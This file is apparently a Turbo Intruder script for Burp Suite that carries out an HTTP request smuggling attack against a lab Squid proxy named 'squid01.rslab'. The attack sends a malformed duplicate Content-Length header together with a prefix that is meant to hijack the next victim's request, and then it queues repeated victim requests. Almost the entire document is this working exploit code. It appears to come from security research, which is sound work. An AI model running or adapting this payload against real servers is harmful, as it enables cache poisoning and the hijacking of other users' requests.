# if you edit this file, ensure you keep the line endings as CRLF or you'll have a bad time
def queueRequests(target, wordlists):

    # to use Burp's HTTP stack for upstream proxy rules etc, use engine=Engine.BURP
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1, # if you increase this from 1, you may get false positives
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )

    # The attack to send
    attack = '''POST /b.shtml HTTP/1.1
Host: squid01.rslab
Connection: Keep-Alive
Content-Length: %d
Content-Length abcde: 0

'''
    
    # This will prefix the victim's request. Edit it to achieve the desired effect.
    prefix = '''GET /a.html HTTP/1.1
Something: '''

    # The request engine will auto-fix the content-length for us
    attack += prefix
    attack = attack % len(prefix)
    engine.queue(attack)

    victim = '''GET /turbo.html HTTP/1.1
Host: squid01.rslab

'''
    for i in range(14):
        engine.queue(victim)
        time.sleep(0.05)


def handleResponse(req, interesting):
    table.add(req)
